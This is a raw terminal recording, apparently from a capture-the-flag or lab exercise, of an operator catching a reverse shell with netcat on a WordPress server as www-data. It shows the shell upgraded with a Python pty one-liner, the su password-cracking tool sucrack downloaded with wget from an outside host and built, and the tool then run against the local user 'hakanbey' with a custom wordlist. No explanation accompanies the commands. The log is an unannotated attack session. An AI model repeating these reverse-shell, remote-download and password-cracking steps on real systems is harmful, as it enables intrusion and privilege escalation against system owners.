@@ -1,0 +1,378 @@
+Script started on 2025-02-21 10:52:51+03:00 [COMMAND="rlwrap nc -lvnp 6047" TERM="xterm-256color" TTY="/dev/pts/3" COLUMNS="104" LINES="27"]
+[?2004hlistening on [any] 6047 ...
+[Kconnect to [172.21.1.38] from (UNKNOWN) [172.21.0.1] 11223
+SOCKET: Shell has connected! PID: 4593
+[K[K[?2004hpython3 -c 'impot[Krt pty;pty.spawn("/bin/bash")[C[C[C[C[C[C[C[C[C[C[C[C[C'[?2004l[K[?2004hpython3 -c 'import pty;pty.spawn("/bin/bash")'
+[Kwww-data@ubuntu:/var/www/subdomain$ [Kwww-data@ubuntu:/var/www/subdomain$ [K[?2004hwww-data@ubuntu:/var/www/subdomain$ cd tmp[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd tmp
+[Kcd tmp
+bash: cd: tmp: No such file or directory
+www-data@ubuntu:/var/www/subdomain$ [Kwww-data@ubuntu:/var/www/subdomain$ [K[?2004hwww-data@ubuntu:/var/www/subdomain$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+announcements	 wp-admin	       wp-includes	  wp-signup.php
+index.php	 wp-blog-header.php    wp-links-opml.php  wp-trackback.php
+license.txt	 wp-comments-post.php  wp-load.php	  xmlrpc.php
+readme.html	 wp-config.php	       wp-login.php
+reverse.php	 wp-content	       wp-mail.php
+wp-activate.php  wp-cron.php	       wp-settings.php
+www-data@ubuntu:/var/www/subdomain$ [Kwww-data@ubuntu:/var/www/subdomain$ [K[?2004hwww-data@ubuntu:/var/www/subdomain$ cd /tmp[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd /tmp
+[Kcd /tmp
+www-data@ubuntu:/tmp$ [Kwww-data@ubuntu:/tmp$ [K[?2004hwww-data@ubuntu:/tmp$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+[K10.8.61.245  custom.txt  wget-log
+www-data@ubuntu:/tmp$ [Kwww-data@ubuntu:/tmp$ [K[?2004hwww-data@ubuntu:/tmp$ rm 10* wget*[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hrm 10* wget*
+[Krm 10* wget*
+rm: cannot remove '10.8.61.245': Is a directory
+www-data@ubuntu:/tmp$ [Kwww-data@ubuntu:/tmp$ [K[?2004hwww-data@ubuntu:/tmp$ [7mwget http://10.8.61.245/sucrack[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cwget http://10.8.61.245/sucrack[C-http://10.8.61.245/sucrackrhttp://10.8.61.245/sucrack http://10.8.61.245/sucrack[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hwget -r http://10.8.61.245/sucrack
+[Kwget -r http://10.8.61.245/sucrack
+--2025-02-21 07:53:39--  http://10.8.61.245/sucrack
+Connecting to 10.8.61.245:80... [KConnecting to 10.8.61.245:80... [KConnecting to 10.8.61.245:80... connected.
+HTTP request sent, awaiting response... [KHTTP request sent, awaiting response... [KHTTP request sent, awaiting response... 301 Moved Permanently
+Location: /sucrack/ [following]
+--2025-02-21 07:53:40--  http://10.8.61.245/sucrack/
+Connecting to 10.8.61.245:80... [KConnecting to 10.8.61.245:80... [KConnecting to 10.8.61.245:80... connected.
+HTTP request sent, awaiting response... [KHTTP request sent, awaiting response... [KHTTP request sent, awaiting response... 200 OK
+Length: 1041 (1.0K) [text/html]
+10.8.61.245/sucrack: Is a directory
+
+Cannot write to '10.8.61.245/sucrack' (Is a directory).
+www-data@ubuntu:/tmp$ [Kwww-data@ubuntu:/tmp$ [K[?2004hwww-data@ubuntu:/tmp$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+10.8.61.245  custom.txt
+www-data@ubuntu:/tmp$ [Kwww-data@ubuntu:/tmp$ [K[?2004hwww-data@ubuntu:/tmp$ cd 10.8.61.1[K245[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd 10.8.61.245
+[Kcd 10.8.61.245
+www-data@ubuntu:/tmp/10.8.61.245$ [Kwww-data@ubuntu:/tmp/10.8.61.245$ [K[?2004hwww-data@ubuntu:/tmp/10.8.61.245$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+sucrack
+www-data@ubuntu:/tmp/10.8.61.245$ [Kwww-data@ubuntu:/tmp/10.8.61.245$ [K[?2004hwww-data@ubuntu:/tmp/10.8.61.245$ cd sucrack[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd sucrack
+[Kcd sucrack
+www-data@ubuntu:/tmp/10.8.61.245/sucrack$ [Kwww-data@ubuntu:/tmp/10.8.61.245/sucrack$ [K[?2004hwww-data@ubuntu:/tmp/10.8.61.245/sucrack$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+COPYING    Makefile.am	VERSION     config.guess  configure	doc	    src
+ChangeLog  Makefile.in	aclocal.m4  config.h.in   configure.ac	install-sh
+INSTALL    README.md	compile     config.sub	  depcomp	missing
+www-data@ubuntu:/tmp/10.8.61.245/sucrack$ [Kwww-data@ubuntu:/tmp/10.8.61.245/sucrack$ [K[?2004hwww-data@ubuntu:/tmp/10.8.61.245/sucrack$ ./configure[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004h./configure
+[K./configure
+bash: ./configure: Permission denied
+www-data@ubuntu:/tmp/10.8.61.245/sucrack$ [Kwww-data@ubuntu:/tmp/10.8.61.245/sucrack$ [K[?2004hwww-data@ubuntu:/tmp/10.8.61.245/sucrack$ chmod +x confiu[Kgure[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hchmod +x configure
+[Kchmod +x configure
+www-data@ubuntu:/tmp/10.8.61.245/sucrack$ [Kwww-data@ubuntu:/tmp/10.8.61.245/sucrack$ [K[?2004hwww-data@ubuntu:/tmp/10.8.61.245/sucrack$ ./configure[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004h./configure
+[K./configure
+[Kchecking for a BSD-compatible install... [Kchecking for a BSD-compatible install... [Kchecking for a BSD-compatible install... /usr/bin/install -c
+checking whether build environment is sane... yes
+[Kchecking for a thread-safe mkdir -p... /bin/mkdir -p
+checking for gawk... [Kchecking for gawk... [Kchecking for gawk... gawk
+checking whether make sets $(MAKE)... [Kchecking whether make sets $(MAKE)... [Kchecking whether make sets $(MAKE)... yes
+checking whether make supports nested variables... yes
+[Kchecking build system type... [Kchecking build system type... [Kchecking build system type... x86_64-pc-linux-gnu
+checking host system type... x86_64-pc-linux-gnu
+checking target system type... x86_64-pc-linux-gnu
+checking for gcc... gcc
+[Kchecking whether the C compiler works... [Kchecking whether the C compiler works... [Kchecking whether the C compiler works... yes
+checking for C compiler default output file name... a.out
+checking for suffix of executables... [Kchecking for suffix of executables... [Kchecking for suffix of executables... 
+[Kchecking whether we are cross compiling... [Kchecking whether we are cross compiling... [Kchecking whether we are cross compiling... no
+checking for suffix of object files... [Kchecking for suffix of object files... [Kchecking for suffix of object files... o
+checking whether we are using the GNU C compiler... [Kchecking whether we are using the GNU C compiler... [Kchecking whether we are using the GNU C compiler... yes
+checking whether gcc accepts -g... [Kchecking whether gcc accepts -g... [Kchecking whether gcc accepts -g... yes
+checking for gcc option to accept ISO C89... [Kchecking for gcc option to accept ISO C89... [Kchecking for gcc option to accept ISO C89... none needed
+checking whether gcc understands -c and -o together... [Kchecking whether gcc understands -c and -o together... [Kchecking whether gcc understands -c and -o together... yes
+checking for style of include used by make... [Kchecking for style of include used by make... [Kchecking for style of include used by make... GNU
+checking dependency style of gcc... [Kchecking dependency style of gcc... [Kchecking dependency style of gcc... gcc3
+checking how to run the C preprocessor... [Kchecking how to run the C preprocessor... [Kchecking how to run the C preprocessor... gcc -E
+[Kchecking for grep that handles long lines and -e... [Kchecking for grep that handles long lines and -e... [Kchecking for grep that handles long lines and -e... /bin/grep
+checking for egrep... /bin/grep -E
+checking for ANSI C header files... [Kchecking for ANSI C header files... [Kchecking for ANSI C header files... yes
+checking for sys/wait.h that is POSIX.1 compatible... [Kchecking for sys/wait.h that is POSIX.1 compatible... [Kchecking for sys/wait.h that is POSIX.1 compatible... yes
+checking for sys/types.h... [Kchecking for sys/types.h... [Kchecking for sys/types.h... yes
+[Kchecking for sys/stat.h... [Kchecking for sys/stat.h... [Kchecking for sys/stat.h... yes
+[Kchecking for stdlib.h... [Kchecking for stdlib.h... [Kchecking for stdlib.h... yes
+[Kchecking for string.h... [Kchecking for string.h... [Kchecking for string.h... yes
+[Kchecking for memory.h... [Kchecking for memory.h... [Kchecking for memory.h... yes
+[Kchecking for strings.h... [Kchecking for strings.h... [Kchecking for strings.h... yes
+[Kchecking for inttypes.h... [Kchecking for inttypes.h... [Kchecking for inttypes.h... yes
+[Kchecking for stdint.h... [Kchecking for stdint.h... [Kchecking for stdint.h... yes
+[Kchecking for unistd.h... [Kchecking for unistd.h... [Kchecking for unistd.h... yes
+[Kchecking fcntl.h usability... [Kchecking fcntl.h usability... [Kchecking fcntl.h usability... yes
+checking fcntl.h presence... [Kchecking fcntl.h presence... [Kchecking fcntl.h presence... yes
+checking for fcntl.h... yes
+[Kchecking for stdlib.h... (cached) yes
+checking for string.h... (cached) yes
+[Kchecking sys/ioctl.h usability... [Kchecking sys/ioctl.h usability... [Kchecking sys/ioctl.h usability... yes
+checking sys/ioctl.h presence... [Kchecking sys/ioctl.h presence... [Kchecking sys/ioctl.h presence... yes
+checking for sys/ioctl.h... yes
+[Kchecking for unistd.h... (cached) yes
+[Kchecking pthread.h usability... [Kchecking pthread.h usability... [Kchecking pthread.h usability... yes
+checking pthread.h presence... [Kchecking pthread.h presence... [Kchecking pthread.h presence... yes
+checking for pthread.h... yes
+[Kchecking for an ANSI C-conforming const... [Kchecking for an ANSI C-conforming const... [Kchecking for an ANSI C-conforming const... yes
+checking whether struct tm is in sys/time.h or time.h... [Kchecking whether struct tm is in sys/time.h or time.h... [Kchecking whether struct tm is in sys/time.h or time.h... time.h
+[Kchecking whether gcc needs -traditional... [Kchecking whether gcc needs -traditional... [Kchecking whether gcc needs -traditional... no
+checking for stdlib.h... (cached) yes
+checking for GNU libc compatible malloc... [Kchecking for GNU libc compatible malloc... [Kchecking for GNU libc compatible malloc... yes
+checking for stdlib.h... (cached) yes
+checking for GNU libc compatible realloc... [Kchecking for GNU libc compatible realloc... [Kchecking for GNU libc compatible realloc... yes
+checking for pid_t... [Kchecking for pid_t... [Kchecking for pid_t... yes
+checking vfork.h usability... [Kchecking vfork.h usability... [Kchecking vfork.h usability... no
+checking vfork.h presence... [Kchecking vfork.h presence... [Kchecking vfork.h presence... no
+checking for vfork.h... no
+[Kchecking for fork... [Kchecking for fork... [Kchecking for fork... yes
+[Kchecking for vfork... [Kchecking for vfork... [Kchecking for vfork... yes
+[Kchecking for working fork... [Kchecking for working fork... [K[?2004hchecking for working fork...    [K[?2004l[Kchecking for working fork... yes
+checking for working vfork... (cached) yes
+[K[?2004h        [K[?2004lchecking for dup2... [K[?2004hchecking for dup2...    [K[?2004l[Kchecking for dup2... yes
+[K[?2004h        [K[?2004lchecking for memset... [K[?2004hchecking for memset...  [K[?2004l[Kchecking for memset... yes
+[K[?2004h        [K[?2004lchecking for strdup... [K[?2004hchecking for strdup...  [K[?2004l[Kchecking for strdup... yes
+[K[?2004h        [K[?2004lchecking for strstr... [K[?2004hchecking for strstr...  [K[?2004l[Kchecking for strstr... yes
+[K[?2004h        [K[?2004lchecking that generated files are newer than configure... done
+configure: creating ./config.status
+[K[?2004h        [K[?2004lconfig.status: creating Makefile
+[K[?2004h        [K[?2004lconfig.status: creating src/Makefile
+[K[?2004h        [K[?2004lconfig.status: creating config.h
+[K[?2004h        [K[?2004lconfig.status: executing depfiles commands
+[K[?2004h        [K[?2004l
+sucrack configuration
+---------------------
+sucrack version		: 1.2.3
+target system           : LINUX
+sucrack link flags      : -pthread
+sucrack compile flags	: -DSTATIC_BUFFER  -DLINUX -DSUCRACK_TITLE="\"sucrack 1.2.3 (LINUX)\""
+
+[K[?2004h        [K[?2004lwww-data@ubuntu:/tmp/10.8.61.245/sucrack$ [K[?2004hwww-data@ubuntu:/tmp/10.8.61.245/sucrack$       [Kmake[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hmake
+[Kmake
+[Kmake  all-recursive
+[Kmake[1]: Entering directory '/tmp/10.8.61.245/sucrack'
+Making all in src
+make[2]: Entering directory '/tmp/10.8.61.245/sucrack/src'
+gcc -DHAVE_CONFIG_H -I. -I..    -Wall -O2 -D_GNU_SOURCE -DSTATIC_BUFFER  -DLINUX -DSUCRACK_TITLE="\"sucrack 1.2.3 (LINUX)\"" -g -O2 -MT sucrack-sucrack.o -MD -MP -MF .deps/sucrack-sucrack.Tpo -c -o sucrack-sucrack.o `test -f 'sucrack.c' || echo './'`sucrack.c
+[KIn file included from sucrack.c:41:0:
+rules.h:59:20: warning: 'rules_map' defined but not used [-Wunused-variable]
+ static rules_map_t rules_map[] = {
+                    ^~~~~~~~~
+[Kmv -f .deps/sucrack-sucrack.Tpo .deps/sucrack-sucrack.Po
+[Kgcc -DHAVE_CONFIG_H -I. -I..    -Wall -O2 -D_GNU_SOURCE -DSTATIC_BUFFER  -DLINUX -DSUCRACK_TITLE="\"sucrack 1.2.3 (LINUX)\"" -g -O2 -MT sucrack-worker.o -MD -MP -MF .deps/sucrack-worker.Tpo -c -o sucrack-worker.o `test -f 'worker.c' || echo './'`worker.c
+[Kworker.c: In function 'worker_run':
+worker.c:152:9: warning: variable 'rs' set but not used [-Wunused-but-set-variable]
+     int rs;
+         ^~
+worker.c:151:13: warning: variable 'then' set but not used [-Wunused-but-set-variable]
+     clock_t then;
+             ^~~~
+[Kmv -f .deps/sucrack-worker.Tpo .deps/sucrack-worker.Po
+gcc -DHAVE_CONFIG_H -I. -I..    -Wall -O2 -D_GNU_SOURCE -DSTATIC_BUFFER  -DLINUX -DSUCRACK_TITLE="\"sucrack 1.2.3 (LINUX)\"" -g -O2 -MT sucrack-dictionary.o -MD -MP -MF .deps/sucrack-dictionary.Tpo -c -o sucrack-dictionary.o `test -f 'dictionary.c' || echo './'`dictionary.c
+[Kdictionary.c: In function 'dict_update_buffer_wait':
+dictionary.c:340:13: warning: variable 'then' set but not used [-Wunused-but-set-variable]
+     clock_t then;
+             ^~~~
+[Kmv -f .deps/sucrack-dictionary.Tpo .deps/sucrack-dictionary.Po
+[Kgcc -DHAVE_CONFIG_H -I. -I..    -Wall -O2 -D_GNU_SOURCE -DSTATIC_BUFFER  -DLINUX -DSUCRACK_TITLE="\"sucrack 1.2.3 (LINUX)\"" -g -O2 -MT sucrack-pty.o -MD -MP -MF .deps/sucrack-pty.Tpo -c -o sucrack-pty.o `test -f 'pty.c' || echo './'`pty.c
+[Kmv -f .deps/sucrack-pty.Tpo .deps/sucrack-pty.Po
+[Kgcc -DHAVE_CONFIG_H -I. -I..    -Wall -O2 -D_GNU_SOURCE -DSTATIC_BUFFER  -DLINUX -DSUCRACK_TITLE="\"sucrack 1.2.3 (LINUX)\"" -g -O2 -MT sucrack-su.o -MD -MP -MF .deps/sucrack-su.Tpo -c -o sucrack-su.o `test -f 'su.c' || echo './'`su.c
+[Ksu.c: In function 'su_run':
+su.c:109:13: warning: variable 'then' set but not used [-Wunused-but-set-variable]
+     clock_t then;
+             ^~~~
+[Kmv -f .deps/sucrack-su.Tpo .deps/sucrack-su.Po
+[Kgcc -DHAVE_CONFIG_H -I. -I..    -Wall -O2 -D_GNU_SOURCE -DSTATIC_BUFFER  -DLINUX -DSUCRACK_TITLE="\"sucrack 1.2.3 (LINUX)\"" -g -O2 -MT sucrack-rewriter.o -MD -MP -MF .deps/sucrack-rewriter.Tpo -c -o sucrack-rewriter.o `test -f 'rewriter.c' || echo './'`rewriter.c
+[Krewriter.c: In function 'rewr_add_rules':
+rewriter.c:55:9: warning: unused variable 's' [-Wunused-variable]
+     int s;
+         ^
+rewriter.c: In function 'rewr_get_rules':
+rewriter.c:74:31: warning: implicit declaration of function 'malloc' [-Wimplicit-function-declaration]
+     rule_set = (rule_set_t *) malloc(sizeof(rule_set_t));
+                               ^~~~~~
+rewriter.c:74:31: warning: incompatible implicit declaration of built-in function 'malloc'
+rewriter.c:74:31: note: include '<stdlib.h>' or provide a declaration of 'malloc'
+[Kmv -f .deps/sucrack-rewriter.Tpo .deps/sucrack-rewriter.Po
+[Kgcc -DHAVE_CONFIG_H -I. -I..    -Wall -O2 -D_GNU_SOURCE -DSTATIC_BUFFER  -DLINUX -DSUCRACK_TITLE="\"sucrack 1.2.3 (LINUX)\"" -g -O2 -MT sucrack-util.o -MD -MP -MF .deps/sucrack-util.Tpo -c -o sucrack-util.o `test -f 'util.c' || echo './'`util.c
+[Kmv -f .deps/sucrack-util.Tpo .deps/sucrack-util.Po
+[Kgcc -DHAVE_CONFIG_H -I. -I..    -Wall -O2 -D_GNU_SOURCE -DSTATIC_BUFFER  -DLINUX -DSUCRACK_TITLE="\"sucrack 1.2.3 (LINUX)\"" -g -O2 -MT sucrack-stat.o -MD -MP -MF .deps/sucrack-stat.Tpo -c -o sucrack-stat.o `test -f 'stat.c' || echo './'`stat.c
+[Kmv -f .deps/sucrack-stat.Tpo .deps/sucrack-stat.Po
+[Kgcc -DHAVE_CONFIG_H -I. -I..    -Wall -O2 -D_GNU_SOURCE -DSTATIC_BUFFER  -DLINUX -DSUCRACK_TITLE="\"sucrack 1.2.3 (LINUX)\"" -g -O2 -MT sucrack-rules.o -MD -MP -MF .deps/sucrack-rules.Tpo -c -o sucrack-rules.o `test -f 'rules.c' || echo './'`rules.c
+[Krules.c: In function 'rules_prepend_digit':
+rules.c:117:5: warning: ignoring return value of 'asprintf', declared with attribute warn_unused_result [-Wunused-result]
+     asprintf(&out, "%i%s", *(int*) arg, in);
+     ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+rules.c: In function 'rules_append_digit':
+rules.c:131:5: warning: ignoring return value of 'asprintf', declared with attribute warn_unused_result [-Wunused-result]
+     asprintf(&out, "%s%i", in, *(int*) arg);
+     ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+In file included from rules.c:32:0:
+At top level:
+rules.h:59:20: warning: 'rules_map' defined but not used [-Wunused-variable]
+ static rules_map_t rules_map[] = {
+                    ^~~~~~~~~
+[Kmv -f .deps/sucrack-rules.Tpo .deps/sucrack-rules.Po
+gcc -Wall -O2 -D_GNU_SOURCE -DSTATIC_BUFFER  -DLINUX -DSUCRACK_TITLE="\"sucrack 1.2.3 (LINUX)\"" -g -O2 -pthread  -o sucrack sucrack-sucrack.o sucrack-worker.o sucrack-dictionary.o sucrack-pty.o sucrack-su.o sucrack-rewriter.o sucrack-util.o sucrack-stat.o sucrack-rules.o  
+[Kmake[2]: Leaving directory '/tmp/10.8.61.245/sucrack/src'
+[Kmake[2]: Entering directory '/tmp/10.8.61.245/sucrack'
+make[2]: Leaving directory '/tmp/10.8.61.245/sucrack'
+make[1]: Leaving directory '/tmp/10.8.61.245/sucrack'
+www-data@ubuntu:/tmp/10.8.61.245/sucrack$ [Kwww-data@ubuntu:/tmp/10.8.61.245/sucrack$ [K[?2004hwww-data@ubuntu:/tmp/10.8.61.245/sucrack$ make install[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hmake install
+[Kmake install
+[KMaking install in src
+[Kmake[1]: Entering directory '/tmp/10.8.61.245/sucrack/src'
+make[2]: Entering directory '/tmp/10.8.61.245/sucrack/src'
+make[2]: Nothing to be done for 'install-exec-am'.
+[K /bin/mkdir -p '/usr/local/bin'
+  /usr/bin/install -c sucrack '/usr/local/bin'
+/usr/bin/install: cannot create regular file '/usr/local/bin/sucrack': Permission denied
+Makefile:316: recipe for target 'install-sucrackprgPROGRAMS' failed
+make[2]: *** [install-sucrackprgPROGRAMS] Error 1
+make[2]: Leaving directory '/tmp/10.8.61.245/sucrack/src'
+Makefile:615: recipe for target 'install-am' failed
+make[1]: *** [install-am] Error 2
+make[1]: Leaving directory '/tmp/10.8.61.245/sucrack/src'
+[KMakefile:445: recipe for target 'install-recursive' failed
+make: *** [install-recursive] Error 1
+www-data@ubuntu:/tmp/10.8.61.245/sucrack$ [Kwww-data@ubuntu:/tmp/10.8.61.245/sucrack$ [K[?2004hwww-data@ubuntu:/tmp/10.8.61.245/sucrack$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+[KCOPYING    Makefile.am	aclocal.m4    config.h.in    configure	   install-sh
+ChangeLog  Makefile.in	compile       config.log     configure.ac  missing
+INSTALL    README.md	config.guess  config.status  depcomp	   src
+Makefile   VERSION	config.h      config.sub     doc	   stamp-h1
+www-data@ubuntu:/tmp/10.8.61.245/sucrack$ [Kwww-data@ubuntu:/tmp/10.8.61.245/sucrack$ [K[?2004hwww-data@ubuntu:/tmp/10.8.61.245/sucrack$ cd src[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd src
+[Kcd src
+www-data@ubuntu:/tmp/10.8.61.245/sucrack/src$ [Kwww-data@ubuntu:/tmp/10.8.61.245/sucrack/src$ [K[?2004hwww-data@ubuntu:/tmp/10.8.61.245/sucrack/src$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+Makefile      pty.h	  su.c			sucrack-stat.o	   util.c
+Makefile.am   rewriter.c  su.h			sucrack-su.o	   util.h
+Makefile.in   rewriter.h  sucrack		sucrack-sucrack.o  worker.c
+dictionary.c  rules.c	  sucrack-dictionary.o	sucrack-util.o	   worker.h
+dictionary.h  rules.h	  sucrack-pty.o		sucrack-worker.o
+index.html    stat.c	  sucrack-rewriter.o	sucrack.c
+pty.c	      stat.h	  sucrack-rules.o	sucrack.h
+www-data@ubuntu:/tmp/10.8.61.245/sucrack/src$ [Kwww-data@ubuntu:/tmp/10.8.61.245/sucrack/src$ [K[?2004hwww-data@ubuntu:/tmp/10.8.61.245/sucrack/src$ file sucrack[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hfile sucrack
+[Kfile sucrack
+[Ksucrack: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=38adced2c3695f06fc93e2b855cb2029949f6d6c, with debug_info, not stripped
+www-data@ubuntu:/tmp/10.8.61.245/sucrack/src$ [Kwww-data@ubuntu:/tmp/10.8.61.245/sucrack/src$ [K[?2004hwww-data@ubuntu:/tmp/10.8.61.245/sucrack/src$ cp -rv /tmp/custom.txt .[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcp -rv /tmp/custom.txt .
+[Kcp -rv /tmp/custom.txt .
+'/tmp/custom.txt' -> './custom.txt'
+[Kwww-data@ubuntu:/tmp/10.8.61.245/sucrack/src$ [Kwww-data@ubuntu:/tmp/10.8.61.245/sucrack/src$ [K[?2004hwww-data@ubuntu:/tmp/10.8.61.245/sucrack/src$ chmod +x sucrack[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hchmod +x sucrack
+[Kchmod +x sucrack
+www-data@ubuntu:/tmp/10.8.61.245/sucrack/src$ [Kwww-data@ubuntu:/tmp/10.8.61.245/sucrack/src$ [K[?2004hwww-data@ubuntu:/tmp/10.8.61.245/sucrack/src$ ./sucrack -w [K[Kh[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004h./sucrack -h
+[K./sucrack -h
+sucrack 1.2.3 (LINUX) - the su cracker
+Copyright (C) 2006  Nico Leidecker; nfl@portcullis-security.com
+
+ Usage: ./sucrack [-char] [-w num] [-b size] [-s sec] [-u user] [-l rules] wordlist
+
+ The word list can either be an existing file or stdin. In that case, use '-' instead of a file name
+
+ Options:
+   h       : print this message
+   a       : ansi escape codes not available.
+             Use the --enable-statistics configure flag.
+   s sec   : statistics display interval not available.
+             Use the --enable-statistics configure flag.
+   c       : only print statistics if a key other than `q' is pressed. (default)
+   r       : enable rewriter
+   w num   : number of worker threads running with
+   b size  : size of word list buffer
+   u user  : user account to su to
+   l rules : specify rewriting rules; rules can be:
+               A = all characters upper case
+               F = first character upper case
+               L = last character upper case
+               a [K               a [K               a = all characters lower case
+               f = first character lower case
+               l = last character lower case
+               D = prepend digit
+               d = append digit
+               e = 1337 characters
+               x = all rules
+
+ Environment Variables:
+   SUCRACK_SU_PATH      : The path to su (usually /bin/su or /usr/bin/su)
+
+   SUCRACK_AUTH_FAILURE : The message su returns on an authentication
+                          failure (like "su: Authentication failure" or "su: Sorry")
+   SUCRACK_AUTH_SUCCESS : The message that indicates an authentication
+                          success. This message must not be a password
+                          listed in the wordlist (default is "SUCRACK_SUCCESS")
+
+ Example:
+   export SUCRACK_AUTH_SUCCESS="sucrack_says_hello"
+   ./sucrack -a -w 20 -s 10 -u root -rl AFLafld dict.txt
+www-data@ubuntu:/tmp/10.8.61.245/sucrack/src$ [Kwww-data@ubuntu:/tmp/10.8.61.245/sucrack/src$ [K[?2004hwww-data@ubuntu:/tmp/10.8.61.245/sucrack/src$ .:[K/sucrack -w 100 -b 500 j[Khakanbey custom.txt[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004h./sucrack -w 100 -b 500 hakanbey custom.txt
+[K<ck/src$ ./sucrack -w 100 -b 500 hakanbey custom.txt
+SYSTEM: dict_open: fopen: No such file or directory
+FATAL: dictionary file could not be opened
+ERROR: dictionary could not be initialized
+www-data@ubuntu:/tmp/10.8.61.245/sucrack/src$ [Kwww-data@ubuntu:/tmp/10.8.61.245/sucrack/src$ [K[?2004hwww-data@ubuntu:/tmp/10.8.61.245/sucrack/src$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+Makefile      pty.c	  stat.h		sucrack-rules.o    sucrack.h
+Makefile.am   pty.h	  su.c			sucrack-stat.o	   util.c
+Makefile.in   rewriter.c  su.h			sucrack-su.o	   util.h
+custom.txt    rewriter.h  sucrack		sucrack-sucrack.o  worker.c
+dictionary.c  rules.c	  sucrack-dictionary.o	sucrack-util.o	   worker.h
+dictionary.h  rules.h	  sucrack-pty.o		sucrack-worker.o
+index.html    stat.c	  sucrack-rewriter.o	sucrack.c
+www-data@ubuntu:/tmp/10.8.61.245/sucrack/src$ [Kwww-data@ubuntu:/tmp/10.8.61.245/sucrack/src$ [K[?2004hwww-data@ubuntu:/tmp/10.8.61.245/sucrack/src$ ./sucrack -u hakanbey custom.txt[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004h./sucrack -u hakanbey custom.txt
+[K<1.245/sucrack/src$ ./sucrack -u hakanbey custom.txt
+[K
+[?2004l
+Script done on 2025-02-21 11:00:04+03:00 [COMMAND_EXIT_CODE="1"]
